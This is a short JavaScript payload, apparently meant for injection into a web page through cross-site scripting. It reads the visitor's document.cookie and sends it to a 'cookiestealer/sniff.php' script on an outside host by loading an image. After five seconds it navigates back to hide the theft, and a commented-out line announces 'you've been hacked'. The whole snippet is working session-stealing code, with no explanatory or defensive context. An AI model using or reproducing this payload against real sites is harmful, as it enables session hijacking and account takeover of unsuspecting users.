
img=new Image();
img.src='http://qa.evgmoskalenko.com/cookiestealer/sniff.php?cookie='+document.cookie;
function F() {
    //location='http://site.com';
    history.back();
    //alert("Vas vzlomali! :-)");
} setTimeout(F, 5000);